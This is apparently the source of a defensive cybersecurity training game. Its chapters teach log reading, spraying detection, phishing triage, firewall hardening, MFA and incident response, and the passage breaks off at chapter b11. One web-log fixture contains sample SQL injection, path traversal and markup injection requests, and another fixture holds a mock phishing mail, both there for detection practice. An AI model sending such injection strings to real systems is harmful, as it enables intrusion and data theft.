/* Glasshouse — the blue cell. Defensive chapters. No real networks. */
(function (root) {
  "use strict";

  function host() {
    return {
      user: "watcher",
      prompt: "glasshouse",
      home: "/home/watcher",
      banner: "Glasshouse watch floor. The copies are fictional. The work is in Logs, Mail, or Firewall.",
      fs: {
        "/home": { dir: true },
        "/home/watcher": { dir: true },
        "/home/watcher/readme.txt": { content: "You are on the blue side of the same sealed lab.\n" }
      }
    };
  }

  function lab(extra) {
    const base = {
      files: [],
      mail: [],
      browser: null,
      web: null,
      term: { start: "jump", tools: {}, hosts: { jump: host() } }
    };
    Object.keys(extra || {}).forEach(function (key) { base[key] = extra[key]; });
    return base;
  }

  const blue = [];

  blue.push({
    id: "b1",
    track: "blue",
    tier: 1,
    voice: "wren",
    title: "The Other Chair",
    concept: "What defenders do, and the CIA triad",
    objective: "Read Wren. Then answer what a defender protects.",
    hints: [
      "A defender watches, decides, and writes down the fix. They do not collect souvenirs.",
      "CIA here means confidentiality, integrity, and availability. Three words for secret, correct, and reachable.",
      "Confidentiality: only the right people see it. Integrity: nobody quietly changes it. Availability: the people who should get in, can."
    ],
    learned: "Glasshouse is Helix's blue cell. Defenders watch the same systems Night Audit tests, then choose a fix. Confidentiality means the secret stays with the right people. Integrity means the data is not quietly changed. Availability means the service stays up for the people who should use it.",
    check: [
      {
        q: "What does a defender do with a finding?",
        options: [
          { t: "Watch it, name the fix, and write it down.", ok: true },
          { t: "Copy the data so the story is better.", why: "Copying the data is a second problem. The job is the fix." }
        ]
      },
      {
        q: "Which line is the CIA triad?",
        options: [
          { t: "Confidentiality, integrity, availability.", ok: true },
          { t: "Scan, exploit, and report.", why: "That is an attack shape. Defenders protect secrecy, correctness, and uptime." }
        ]
      }
    ],
    codex: [
      {
        id: "soc",
        term: "Blue team",
        def: "The people who watch a system, notice what should not happen, and get it fixed. In this story that cell is Glasshouse.",
        defend: "Give them the same written scope the testers have, plus the logs and the authority to change a setting."
      },
      {
        id: "cia",
        term: "CIA triad",
        def: "Confidentiality, integrity, availability. Who may see it, whether it is still the real data, and whether the service is up.",
        defend: "When you rate a finding, say which of the three broke. A leaked file, a changed file, and a down site are different repairs."
      }
    ],
    debrief: {
      what: "You sat the other chair. The same fictional Helix staging range is now something you protect, not only something you test.",
      defend: "Write findings as impact on confidentiality, integrity, or availability, plus the change that restores it.",
      detect: "Nothing to detect yet. The next chapters are the tapes those detections come from.",
      url: "https://www.nist.gov/cyberframework",
      urlLabel: "NIST Cybersecurity Framework"
    },
    lab: lab({}),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "quill", text: "{name}. Helix asked for a second hire. Same city, other chair. Wren runs Glasshouse, their watch floor." },
        { do: "say", who: "wren", text: "Wren. I don't want a souvenir. I want the door closed and a sentence a tired admin can follow." },
        { do: "say", who: "wren", text: "Three words. Confidentiality: the right people see it. Integrity: nobody changes it in the dark. Availability: the people who should get in, can." },
        { do: "say", who: "lena", text: "Lena. I still speak for Helix. If you see live personal data, you stop and tell me. That rule did not change chairs." },
        { do: "finish" }
      ]
    }
  });

  blue.push({
    id: "b2",
    track: "blue",
    tier: 1,
    voice: "wren",
    title: "The Map",
    concept: "Asset inventory and attack surface",
    objective: "Read the asset card. Then say which things Glasshouse actually watches.",
    goalText: { "read-assets": "Open Files and read the asset card." },
    goals: ["read-assets", "q-assets"],
    hints: [
      "An asset is something you mean to protect: a site, a server, an account, a log.",
      "The attack surface is every place a stranger can already reach. A public page is on it. A rumor is not.",
      "Watch helixdyne.example, the staging VPN name, and the lab range 192.0.2.0/24. Do not watch live payroll."
    ],
    learned: "An asset is a thing you decided to protect. The attack surface is every place someone can already touch it: a public site, an open door, a name posted in a talk. Glasshouse watches the staging list. Live payroll is not on that list.",
    check: [
      {
        q: "What is an attack surface?",
        options: [
          { t: "The places a stranger can already reach.", ok: true },
          { t: "A list of passwords.", why: "Passwords are secrets. The surface is the doors and names that are already public." }
        ]
      },
      {
        q: "Which one does Glasshouse leave alone?",
        options: [
          { t: "Live payroll. It is not on the staging list.", ok: true },
          { t: "The public website. Marketing is not an asset.", why: "The public website is on the list. People can already open it." }
        ]
      }
    ],
    codex: [
      {
        id: "asset",
        term: "Asset",
        def: "Something you mean to keep working and keep honest: a site, a server, an account, a log, a badge database.",
        defend: "If it is not on the inventory, nobody is watching it. Write the list down before the test window."
      },
      {
        id: "surface",
        term: "Attack surface",
        def: "Every place an outsider can already reach an asset. A public page, an open port, a hostname in a talk.",
        defend: "Shrink it. Close unused doors. Don't post hostnames as jokes."
      }
    ],
    debrief: {
      what: "You read the staging inventory. The public site, the VPN name, and the lab range are in watch. Payroll is out.",
      defend: "Keep the inventory next to the scope. When either list changes, tell both cells.",
      detect: "You cannot detect a problem on a host you do not know you own.",
      url: "https://www.cisa.gov/topics/cybersecurity-best-practices",
      urlLabel: "CISA cybersecurity best practices"
    },
    lab: lab({
      files: [{
        id: "assets",
        title: "Glasshouse asset card — staging",
        goal: "read-assets",
        body: "WATCH\n- helixdyne.example, the public site\n- vpn-staging.helixdyne.example, the name Ivo posted\n- lab hosts 192.0.2.0/24, the sealed copy only\n\nDO NOT WATCH, AND DO NOT OPEN\n- live payroll\n- production city turnstiles\n- anything not on this card\n\nAttack surface means the first three, because a stranger can already find them."
      }]
    }),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "wren", text: "Before I trust an alert, I want the map. An asset is a thing we meant to protect. The attack surface is where a stranger can already touch it." },
        { do: "card", who: "wren", title: "Asset card", sub: "Files", app: "files", doc: "assets" },
        { do: "await", goals: ["read-assets"] },
        { do: "say", who: "wren", text: "Which set does Glasshouse watch?" },
        {
          do: "choice",
          options: [
            { id: "map-pay", text: "Live payroll. It is valuable.", wrong: true, reply: { who: "wren", text: "Valuable is not the same as in scope. Payroll is not on the card." } },
            { id: "map-ok", text: "The public site, the staging VPN name, and the lab range.", goal: "q-assets", goto: "close" }
          ]
        }
      ],
      close: [
        { do: "say", who: "wren", text: "Good. We do not defend the whole city. We defend the list." },
        { do: "finish" }
      ]
    }
  });

  blue.push({
    id: "b3",
    track: "blue",
    tier: 1,
    voice: "wren",
    title: "The Tape",
    concept: "Reading a log",
    objective: "Open Logs. Filter for fail. Flag the failed login. Leave the successful one.",
    goalText: { "flagged-fail": "In Logs, filter for fail, then flag the failed login line." },
    goals: ["flagged-fail"],
    scaffold: [{ goal: "flagged-fail", command: "fail", app: "logs" }],
    hints: [
      "A log is a diary the computer writes. Each line is one event.",
      "The filter is a simple search. Press Filter: fail, or type fail.",
      "Flag the line that says fail. Do not flag the line that says ok."
    ],
    learned: "A log line is one event: when, who, from where, and what happened. Filtering is how you find the line you care about without reading the whole day. fail is the word. ok is ordinary.",
    check: [
      {
        q: "What is a log line?",
        options: [
          { t: "One recorded event: time, account, address, result.", ok: true },
          { t: "A password.", why: "A log records that something happened. It should not be the password itself." }
        ]
      },
      {
        q: "Why filter?",
        options: [
          { t: "So you see the lines that contain the word you care about.", ok: true },
          { t: "So the other lines are deleted.", why: "A filter only hides lines on your screen. The tape stays." }
        ]
      }
    ],
    codex: [
      {
        id: "log",
        term: "Log",
        def: "A list of events a computer wrote down. A login, a page request, a scheduled task. Each line should say when, who, and what.",
        defend: "Ship a copy somewhere the same computer cannot erase. A log that only lives on the broken box disappears with it."
      }
    ],
    debrief: {
      what: "You filtered an auth log and flagged the failed login. The successful login stayed unflagged.",
      defend: "Decide which fields every login line must have, and keep a copy off the host.",
      detect: "This was one failure. One failure is often a typo. The next chapter is what many failures look like.",
      url: "https://csrc.nist.gov/pubs/sp/800/92/final",
      urlLabel: "NIST SP 800-92, Guide to Computer Security Log Management"
    },
    lab: lab({
      logs: {
        goal: "flagged-fail",
        flag: ["fail-1"],
        sources: [{
          id: "auth",
          label: "Auth",
          lines: [
            { id: "ok-1", text: "09:01 login user=auditor result=ok from 192.0.2.10" },
            { id: "fail-1", text: "09:14 login user=operator result=fail from 192.0.2.40" },
            { id: "ok-2", text: "09:40 login user=lena result=ok from 192.0.2.10" }
          ]
        }]
      }
    }),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "wren", text: "This is the tape. Each line is one event. The filter box keeps the lines that contain what you type." },
        { do: "say", who: "wren", text: "Open Logs. Filter for fail. Flag that line. Do not flag a line that says ok." },
        { do: "card", who: "wren", title: "Auth log", sub: "Logs", app: "logs" },
        { do: "await", goals: ["flagged-fail"] },
        { do: "say", who: "wren", text: "You found the failure without deleting the rest of the day. That is the whole skill." },
        { do: "finish" }
      ]
    }
  });

  blue.push({
    id: "b4",
    track: "blue",
    tier: 1,
    voice: "wren",
    title: "Many Names",
    concept: "Brute force and password spraying",
    objective: "In Logs, flag the summary that shows many usernames failing from one address.",
    goalText: { "flagged-spray": "Flag the SUMMARY line: many usernames, one address, a short time. Not a single typo." },
    goals: ["flagged-spray"],
    hints: [
      "One failed login is often a typo. Spraying is many usernames, or many guesses, from one place, fast.",
      "Look for the line that says SUMMARY. It counts the failures for you.",
      "Flag only spray-sum. Leave the single fail lines. They are the evidence, not each a separate incident."
    ],
    learned: "Password spraying tries a few common secrets across many accounts. Brute force tries many secrets on one account. Both look like a burst of failures from one address. One lonely failure is usually a person typing badly. The summary line is the thing you page someone about.",
    check: [
      {
        q: "Which pattern is spraying?",
        options: [
          { t: "Many usernames failing from one address, quickly.", ok: true },
          { t: "One person mistyping once.", why: "One miss is a typo. Spraying is a burst across names." }
        ]
      },
      {
        q: "What should the log help you see?",
        options: [
          { t: "Who failed, from where, and how many names in how long.", ok: true },
          { t: "The password they were trying.", why: "Do not store the password in the log. Store the count and the address." }
        ]
      }
    ],
    codex: [
      {
        id: "spray",
        term: "Password spraying",
        def: "Trying a few common passwords against many accounts so no single account locks. The log shows many usernames and one source.",
        defend: "Alert on many failures from one address. Slow down repeats. Prefer MFA so a guessed password is not enough."
      },
      {
        id: "brute",
        term: "Brute force",
        def: "Trying many passwords against one account. The log shows one username and a long run of failures.",
        defend: "Lock or slow that account, and alert. Do not log the passwords themselves."
      }
    ],
    debrief: {
      what: "You told a burst of failures across many names from one lab address apart from a single typo.",
      defend: "Page on the burst. Add MFA on the accounts that matter. Keep factory passwords out of the manual.",
      detect: "Count failures by source address and by username. A threshold on either one is the alert.",
      url: "https://attack.mitre.org/techniques/T1110/",
      urlLabel: "MITRE ATT&CK — Brute Force (T1110)"
    },
    lab: lab({
      logs: {
        goal: "flagged-spray",
        flag: ["spray-sum"],
        sources: [{
          id: "auth",
          label: "Auth",
          lines: [
            { id: "f1", text: "09:20 login user=operator result=fail from 192.0.2.40" },
            { id: "f2", text: "09:20 login user=admin result=fail from 192.0.2.40" },
            { id: "f3", text: "09:20 login user=root result=fail from 192.0.2.40" },
            { id: "f4", text: "09:20 login user=guest result=fail from 192.0.2.40" },
            { id: "spray-sum", text: "09:21 SUMMARY 192.0.2.40 failed 40 usernames in 2 minutes" },
            { id: "ok", text: "09:30 login user=auditor result=ok from 192.0.2.10" }
          ]
        }]
      }
    }),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "wren", text: "One fail is a typo. Spraying is many names, one address, almost the same minute." },
        { do: "say", who: "wren", text: "Open Logs. Flag only the SUMMARY line. Leave the single failures. They are the evidence under that summary." },
        { do: "card", who: "wren", title: "Auth log", sub: "Logs", app: "logs" },
        { do: "await", goals: ["flagged-spray"] },
        { do: "say", who: "lena", text: "That address is inside the lab range. I still want the alert. A test that looks like spraying should be on the calendar, or it is an incident." },
        { do: "finish" }
      ]
    }
  });

  blue.push({
    id: "b5",
    track: "blue",
    tier: 1,
    voice: "wren",
    title: "The Header",
    concept: "Triage a phishing email",
    objective: "Open the mail. Read the headers and the real link. Flag it. Do not open the attachment.",
    goalText: { "flagged-phish": "Flag the badge mail. The visible link and the real destination disagree." },
    goals: ["flagged-phish", "q-report"],
    hints: [
      "Read the From address and the Reply-To. Then inspect the link. The blue words can lie.",
      "The real destination is the line labeled Destination after you inspect. It is not helixdyne.example.",
      "Flag the badge mail. Then tell Wren you will report it and leave the attachment closed."
    ],
    learned: "Triage means look before you act. Check who it claims to be, where a reply would go, and where the link actually points. An attachment you were rushed to open stays closed. Then you report it. You do not forward the bait to the whole company.",
    check: [
      {
        q: "What did the header show?",
        options: [
          { t: "The reply address was not the company domain the words claimed.", ok: true },
          { t: "Headers are decoration. Only the logo matters.", why: "The logo is easy to copy. The addresses and the real link are the check." }
        ]
      },
      {
        q: "What do you do with the attachment?",
        options: [
          { t: "Leave it closed and report the mail.", ok: true },
          { t: "Open it on your work computer to see if it is bad.", why: "Opening it is how the bait wins. Report it. Let the mailbox tools hold it." }
        ]
      }
    ],
    codex: [
      {
        id: "header",
        term: "Mail header",
        def: "The hidden address lines: From, Reply-To, Return-Path. They say where the message claims to be from and where a reply would go.",
        defend: "Teach people to look when the reply domain is not the company they know. A matching display name is not proof."
      },
      {
        id: "triage",
        term: "Triage",
        def: "A first sort. For a suspicious mail: who sent it, where the link really goes, whether an attachment is being rushed, then report. Do not click to find out.",
        defend: "Give people one button that reports the message to the watch floor. Don't ask them to forward it around."
      }
    ],
    debrief: {
      what: "You compared the words of the link with its destination, read the reply address, flagged the mail, and left the attachment alone.",
      defend: "A report button, a banner on outside mail, and a rule that unexpected attachments stay closed. The same shape Night Audit flagged from the other chair.",
      detect: "Mail logs and the report button. A burst of the same lure is a campaign, not twenty separate surprises.",
      url: "https://www.cisa.gov/news-events/news/avoiding-social-engineering-and-phishing-attacks",
      urlLabel: "CISA — Avoiding social engineering and phishing"
    },
    lab: lab({
      mail: [{
        id: "badge-urgent",
        from: "Helix IT Security",
        addr: "it-notices@helixdyne-support.example",
        replyTo: "bounce@helix-badge.example",
        subject: "Badge photos expire in 30 minutes",
        time: "22:14",
        phish: true,
        headers: [
          "From: Helix IT Security <it-notices@helixdyne-support.example>",
          "Reply-To: bounce@helix-badge.example",
          "Return-Path: bounce@helix-badge.example"
        ],
        paragraphs: [
          "Your building access will be revoked in 30 minutes unless you open the attachment and re-upload your badge photo.",
          "The attachment is named badge-photo.zip. Do not open it in this exercise."
        ],
        link: { text: "https://helixdyne.example/badge", href: "http://helix-badge.example/login" }
      }]
    }),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "wren", text: "A mail is asking the company to panic. Triage it. Headers, then the real link. The attachment stays closed." },
        { do: "card", who: "wren", title: "Suspicious mail", sub: "Mail", app: "mail" },
        { do: "await", goals: ["flagged-phish"] },
        { do: "say", who: "wren", text: "You flagged it. What do you do next?" },
        {
          do: "choice",
          options: [
            { id: "open-zip", text: "Open the zip so I can describe it.", wrong: true, reply: { who: "wren", text: "No. Opening it is the mistake the mail wanted. Report it closed." } },
            { id: "fwd-all", text: "Forward it to the whole company as a warning.", wrong: true, reply: { who: "wren", text: "That spreads the bait. One report to the watch floor is the warning." } },
            { id: "report", text: "Report it. Leave the attachment closed.", goal: "q-report", goto: "close" }
          ]
        }
      ],
      close: [
        { do: "say", who: "lena", text: "I'll have the mailbox hold anything else with that reply domain. Thank you for not clicking." },
        { do: "finish" }
      ]
    }
  });

  blue.push({
    id: "b6",
    track: "blue",
    tier: 2,
    voice: "wren",
    title: "Close the Extra Door",
    concept: "Patching and hardening",
    objective: "On the firewall panel, deny 8443 from anywhere. Leave 443 allowed. Then say the factory passphrase has to change.",
    goalText: { "closed-8443": "Set 8443 to Deny. Leave the website on 443 as Allow." },
    goals: ["closed-8443", "q-factory"],
    hints: [
      "Hardening means turning off what you do not need. The admin panel was on 8443, next to the public site.",
      "Firewall: 8443 becomes Deny. 443 stays Allow. 443 is the website people should reach.",
      "The factory passphrase in the manual has to be changed, not hidden. Pick that answer after the door is shut."
    ],
    learned: "Hardening is closing what you do not need and changing what shipped from the factory. The admin panel does not belong on the public face. The website does. A factory passphrase is changed, not painted over.",
    check: [
      {
        q: "Why did 443 stay open?",
        options: [
          { t: "It is the public website. People are supposed to reach it.", ok: true },
          { t: "Every port should be denied, including the site you mean to run.", why: "Closing the website is an outage, not a fix. Close the extra door." }
        ]
      },
      {
        q: "What happens to a factory passphrase?",
        options: [
          { t: "It gets changed before the panel is reachable.", ok: true },
          { t: "It stays, as long as the page is hard to find.", why: "Hidden is not changed. The manual already printed it." }
        ]
      }
    ],
    codex: [
      {
        id: "harden",
        term: "Hardening",
        def: "Turning off services you do not need, changing factory secrets, and giving each account only the rights it needs.",
        defend: "Do it before go-live. An installer who clicks Next leaves the factory door open."
      },
      {
        id: "least",
        term: "Least privilege",
        def: "Each account and each program gets only the access the job needs. Not root, not 'while you are here.'",
        defend: "A short sudo list and a passphrase that is not the factory one. Review both when people leave."
      }
    ],
    debrief: {
      what: "You denied the admin port on the public face and left the website up. You also required the factory passphrase to change.",
      defend: "Management ports belong behind a VPN. Products should refuse to finish setup until the factory secret is gone.",
      detect: "An alert when 8443 is reachable from anywhere, and when a login uses a published factory pair.",
      url: "https://www.cisa.gov/news-events/news/understanding-patches-and-software-updates",
      urlLabel: "CISA — Understanding patches and software updates"
    },
    lab: lab({
      firewall: {
        goal: "closed-8443",
        rules: [
          { id: "web", label: "443 website", action: "allow", lock: true },
          { id: "admin", label: "8443 admin panel", action: "allow" }
        ],
        want: { admin: "deny", web: "allow" }
      }
    }),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "wren", text: "Night Audit found the admin panel sitting next to the brochure. Hardening is how that stops being true." },
        { do: "say", who: "wren", text: "Open Firewall. Deny 8443. Leave 443 allowed. That second one is the website." },
        { do: "card", who: "wren", title: "Firewall", sub: "8443", app: "firewall" },
        { do: "await", goals: ["closed-8443"] },
        { do: "say", who: "wren", text: "The factory passphrase was still in the manual. What do we do about that?" },
        {
          do: "choice",
          options: [
            { id: "hide", text: "Leave it. The page is harder to find now.", wrong: true, reply: { who: "wren", text: "Harder to find is not changed. The manual already printed it." } },
            { id: "change", text: "Change it before the panel is reachable again.", goal: "q-factory", goto: "close" }
          ]
        }
      ],
      close: [
        { do: "say", who: "lena", text: "I'll rotate it in the lab and on staging. The installer screen will refuse to finish until that field is new." },
        { do: "finish" }
      ]
    }
  });

  blue.push({
    id: "b7",
    track: "blue",
    tier: 2,
    voice: "wren",
    title: "The Gate",
    concept: "Firewall rules",
    objective: "Deny remote login from anywhere. Allow it only from the jump host 192.0.2.10.",
    goalText: { "ssh-locked": "Deny 22 from anywhere. Allow 22 only from 192.0.2.10." },
    goals: ["ssh-locked"],
    hints: [
      "A firewall rule is a line: who, which door, allow or deny. First matching line wins in this panel, so the narrow allow has to exist and the wide open one has to stop.",
      "22 is the remote terminal door. Anywhere should be Deny. The jump host 192.0.2.10 should be Allow.",
      "Set ssh-any to Deny and ssh-jump to Allow."
    ],
    learned: "A firewall rule names a source, a door, and allow or deny. Wide open is easy and wrong. The repair is deny by default, then one allow for the jump host you actually use. The order matters: the exception is written on purpose, not left to chance.",
    check: [
      {
        q: "What should a firewall do with a door you did not mean to publish?",
        options: [
          { t: "Deny it, and allow only the source you wrote down.", ok: true },
          { t: "Allow it. Firewalls are only for slowing people down.", why: "A firewall is the list of who may talk. Slowing is not the same as deciding." }
        ]
      },
      {
        q: "Why keep an allow for 192.0.2.10?",
        options: [
          { t: "That is the jump host the cell is supposed to use.", ok: true },
          { t: "Because every address should have an allow.", why: "Every address is how the door was open. One named host is the exception." }
        ]
      }
    ],
    codex: [
      {
        id: "firewall",
        term: "Firewall rule",
        def: "A line that says which source may use which port, or may not. Allow is a yes. Deny is a no. A useful set starts from no and adds the yeses you meant.",
        defend: "Review the rules when a project ends. Old allows are how forgotten doors survive."
      }
    ],
    debrief: {
      what: "You shut remote login from the world and left it open for the jump host on the card.",
      defend: "Default deny. Name the exceptions. Review them. A firewall is not a substitute for removing a service you do not need.",
      detect: "Log the denies. A sudden pile of denies against 22 is someone knocking. A successful login from an address you did not allow is a rule someone changed.",
      url: "https://www.cisa.gov/news-events/news/understanding-firewalls-home-and-small-office-networks",
      urlLabel: "CISA — Understanding firewalls"
    },
    lab: lab({
      firewall: {
        goal: "ssh-locked",
        rules: [
          { id: "ssh-any", label: "22 from anywhere", action: "allow" },
          { id: "ssh-jump", label: "22 from 192.0.2.10, the jump host", action: "deny" }
        ],
        want: { "ssh-any": "deny", "ssh-jump": "allow" }
      }
    }),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "wren", text: "A firewall is a list. Who, which door, yes or no. This one currently says yes to the remote terminal from anywhere." },
        { do: "say", who: "wren", text: "Deny 22 from anywhere. Allow 22 only from 192.0.2.10. That host is on the card." },
        { do: "card", who: "wren", title: "Firewall", sub: "port 22", app: "firewall" },
        { do: "await", goals: ["ssh-locked"] },
        { do: "say", who: "wren", text: "Default no. One named yes. That is a gate, not a hope." },
        { do: "finish" }
      ]
    }
  });

  blue.push({
    id: "b8",
    track: "blue",
    tier: 2,
    voice: "wren",
    title: "What the Log Saw",
    concept: "Web logs and input handling",
    objective: "Flag the three web lines that are not ordinary pages. Leave the brochure and the normal search.",
    goalText: { "flagged-web": "Flag the markup in search, the line that walks up with .., and the login line that changes the sentence. Not the ordinary ones." },
    goals: ["flagged-web", "q-fixes"],
    hints: [
      "Ordinary lines ask for a normal page or a normal word. The odd lines contain markup, .., or a login that adds OR.",
      "Flag web-mark, web-dot, and web-or. Do not flag the brochure or the plain search.",
      "The fixes are: encode output, keep the database sentence fixed, and refuse paths that climb with ... You will say that next."
    ],
    learned: "The web log is where the earlier lessons show up as requests. Markup in a search means the page may treat words as page code. A path with .. is someone climbing out of the folder you meant. A login line that adds OR is the sentence being rewritten. The fixes are encode output, refuse climbing paths, and keep the database sentence fixed so input stays data.",
    check: [
      {
        q: "A search log contains a tag. What is the repair?",
        options: [
          { t: "Encode output so words stay words.", ok: true },
          { t: "Hide the search box.", why: "Hiding it is not the repair. The page has to treat input as text." }
        ]
      },
      {
        q: "A path in the log climbs with two dots. What does that mean here?",
        options: [
          { t: "The request tried to climb out of the public folder.", ok: true },
          { t: "The user asked for the homepage.", why: "The homepage does not need ... Climbing up is the suspicious part." }
        ]
      }
    ],
    codex: [
      {
        id: "weblog",
        term: "Web log",
        def: "The list of page requests: what was asked, which address asked, and what the server answered. Odd characters in the request are often the finding.",
        defend: "Alert on .., on quotes in fields that should be names, and on tags in a search box. Then fix the code. A filter that only blocks one spelling will miss the next one."
      }
    ],
    debrief: {
      what: "You flagged three requests the lab already knew were wrong: markup in search, a path that climbs, and a login that rewrites the sentence. You left the ordinary pages alone.",
      defend: "Encode output. Parameterize queries. Reject paths that leave the folder you meant to serve. Do not store the raw attack as something the next page will run.",
      detect: "The web log is the detection. The repair is in the code, not only in a bigger firewall.",
      url: "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html",
      urlLabel: "OWASP Input Validation Cheat Sheet"
    },
    lab: lab({
      logs: {
        goal: "flagged-web",
        flag: ["web-mark", "web-dot", "web-or"],
        sources: [{
          id: "web",
          label: "Web",
          lines: [
            { id: "ok-page", text: "GET /brochure 200 from 192.0.2.10" },
            { id: "ok-search", text: "GET /search?q=hours 200 from 192.0.2.10" },
            { id: "web-mark", text: "GET /search?q=<b>test</b> 200 from 192.0.2.40" },
            { id: "web-dot", text: "GET /files/public/../config/app.conf.bak 200 from 192.0.2.40" },
            { id: "web-or", text: "POST /login user=' OR '1'='1 200 from 192.0.2.40" }
          ]
        }]
      }
    }),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "wren", text: "Same week, other chair. The web log still has the requests. Flag the ones that are not ordinary pages." },
        { do: "say", who: "quill", text: "You have seen these shapes. Markup in a search. A path that climbs. A login that rewrites the sentence. Flag those three. Leave the brochure." },
        { do: "card", who: "wren", title: "Web log", sub: "Logs", app: "logs" },
        { do: "await", goals: ["flagged-web"] },
        { do: "say", who: "wren", text: "What do we change in the code?" },
        {
          do: "choice",
          options: [
            { id: "waf-only", text: "Put a filter in front and leave the code.", wrong: true, reply: { who: "wren", text: "A filter misses the next spelling. Change how the page handles input." } },
            { id: "fixes", text: "Encode output, keep the database sentence fixed, and refuse paths that climb.", goal: "q-fixes", goto: "close" }
          ]
        }
      ],
      close: [
        { do: "say", who: "lena", text: "Those three are the patch list. I'll send the names when they land." },
        { do: "finish" }
      ]
    }
  });

  blue.push({
    id: "b9",
    track: "blue",
    tier: 2,
    voice: "wren",
    title: "Two Steps",
    concept: "MFA and password policy",
    objective: "Choose a password rule and a second step that survive a stolen password.",
    goals: ["q-policy", "q-mfa"],
    hints: [
      "Long, unique, and not the factory phrase. A password manager is how humans survive that.",
      "MFA means a second proof. A code or a key. Not a second password written on the same note.",
      "Pick the long unique passphrase, then the second step that is not the same password again."
    ],
    learned: "A password should be long, unique to that system, and not the one printed in a manual. A password manager holds them. MFA is a second proof, so a stolen password is not enough. SMS is a weak second step. An app or a key is stronger. The second step is not another copy of the same secret.",
    check: [
      {
        q: "Which password rule is the useful one?",
        options: [
          { t: "Long, unique, and not a factory phrase.", ok: true },
          { t: "Short, so people can remember one password for everything.", why: "One shared password means one leak opens every door." }
        ]
      },
      {
        q: "What is MFA?",
        options: [
          { t: "A second proof, so a stolen password is not enough.", ok: true },
          { t: "A longer password.", why: "Length is still one secret. MFA is a second, different proof." }
        ]
      }
    ],
    codex: [
      {
        id: "mfa",
        term: "MFA",
        def: "Multi-factor authentication. A second proof besides the password: an app, a hardware key, or a code from a device you have. A stolen password then fails the second step.",
        defend: "Turn it on for mail, VPN, and admin panels first. Prefer an app or a key over a text message."
      },
      {
        id: "policy",
        term: "Password policy",
        def: "The rules for secrets: long, unique, not reused, not the factory example, stored in a password manager. Rotation every 30 days without MFA mostly creates sticky notes.",
        defend: "Length and uniqueness beat clever complexity rules. Check new passwords against known-leaked lists."
      }
    ],
    debrief: {
      what: "You chose long unique passphrases and a real second step. A guessed or reused password is no longer the whole key.",
      defend: "MFA on admin, mail, and VPN. A manager for the long secrets. Alert when MFA is turned off.",
      detect: "A login that succeeds with a password and never offers the second step is a misconfiguration, or an account someone excepted.",
      url: "https://www.cisa.gov/mfa",
      urlLabel: "CISA — Multifactor authentication"
    },
    lab: lab({}),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "wren", text: "The spray worked as far as a password. Policy is how the next one fails earlier." },
        { do: "say", who: "wren", text: "Which rule do you write down?" },
        {
          do: "choice",
          options: [
            { id: "short", text: "Eight characters, reused, changed every month.", wrong: true, reply: { who: "wren", text: "That makes sticky notes. Long and unique, in a manager." } },
            { id: "long", text: "Long, unique, not the factory phrase, kept in a password manager.", goal: "q-policy", goto: "mfa" }
          ]
        }
      ],
      mfa: [
        { do: "say", who: "lena", text: "And if that password is still stolen?" },
        {
          do: "choice",
          options: [
            { id: "same", text: "Ask for the same password a second time.", wrong: true, reply: { who: "lena", text: "That is one secret, typed twice. I need a second proof." } },
            { id: "mfa", text: "Ask for a second proof: an app or a key.", goal: "q-mfa", goto: "close" }
          ]
        }
      ],
      close: [
        { do: "say", who: "wren", text: "Admin, mail, and the VPN get that second step first. The badge brochure can wait." },
        { do: "finish" }
      ]
    }
  });

  blue.push({
    id: "b10",
    track: "blue",
    tier: 3,
    voice: "wren",
    title: "The Clock",
    concept: "Incident response",
    objective: "Put the response in order. Contain before you wipe anything.",
    goals: ["q-order", "q-contain"],
    hints: [
      "The order is prepare, identify, contain, eradicate, recover, then lessons. You do not start by deleting the only copy of the log.",
      "Contain means stop the bleeding: disable the account, block the address, unplug the task. Evidence stays.",
      "After the order question, pick contain: stop the account and keep the logs."
    ],
    learned: "Incident response is a clock, not a panic. Prepare before it happens. Identify what is actually wrong. Contain it so it stops spreading. Eradicate the cause. Recover the service. Then write the lesson. Deleting logs to look calm is how you lose the only proof.",
    check: [
      {
        q: "What comes before eradicate?",
        options: [
          { t: "Identify what it is, and contain it.", ok: true },
          { t: "Wipe the host so the meeting is shorter.", why: "Wiping first destroys the proof and skips the question of what else it touched." }
        ]
      },
      {
        q: "What is contain?",
        options: [
          { t: "Stop it spreading, and keep the evidence.", ok: true },
          { t: "Announce that nothing happened.", why: "That is not containment. The account or the task is still live." }
        ]
      }
    ],
    codex: [
      {
        id: "ir",
        term: "Incident response",
        def: "Prepare, identify, contain, eradicate, recover, lessons learned. A written order so the first hour is not improvised.",
        defend: "Decide who may pull a system offline before the night it happens. Keep the phone numbers in the same plan."
      }
    ],
    debrief: {
      what: "You put the response in order and chose to stop the account without throwing away the log.",
      defend: "Write the six steps down. Practice them on the lab, not for the first time on production.",
      detect: "Identification is the detections you already built. Containment is the switch you can actually reach at 02:00.",
      url: "https://csrc.nist.gov/pubs/sp/800/61/r2/final",
      urlLabel: "NIST SP 800-61, Computer Security Incident Handling Guide"
    },
    lab: lab({}),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "wren", text: "When the summary line is real, nobody wants a debate about the order. Learn it now." },
        { do: "say", who: "wren", text: "Which order is the one we practice?" },
        {
          do: "choice",
          options: [
            { id: "panic", text: "Wipe, announce it is fine, then look.", wrong: true, reply: { who: "wren", text: "That destroys the proof and skips the question of spread. Prepare, identify, contain, eradicate, recover, lessons." } },
            { id: "order", text: "Prepare, identify, contain, eradicate, recover, lessons.", goal: "q-order", goto: "contain" }
          ]
        }
      ],
      contain: [
        { do: "say", who: "wren", text: "The bad account is still logging in. What is contain?" },
        {
          do: "choice",
          options: [
            { id: "wipe", text: "Delete the logs so the timeline looks clean.", wrong: true, reply: { who: "wren", text: "Those logs are how you know what else it touched. Disable the account. Keep the tape." } },
            { id: "hold", text: "Disable the account and keep the logs.", goal: "q-contain", goto: "close" }
          ]
        }
      ],
      close: [
        { do: "say", who: "quill", text: "Lessons learned is a document, not a mood. We will write one after the next two tapes." },
        { do: "finish" }
      ]
    }
  });

  blue.push({
    id: "b11",
    track: "blue",
    tier: 3,
    voice: "wren",
    title: "The Quiet Account",
    concept: "Lateral movement and persistence",
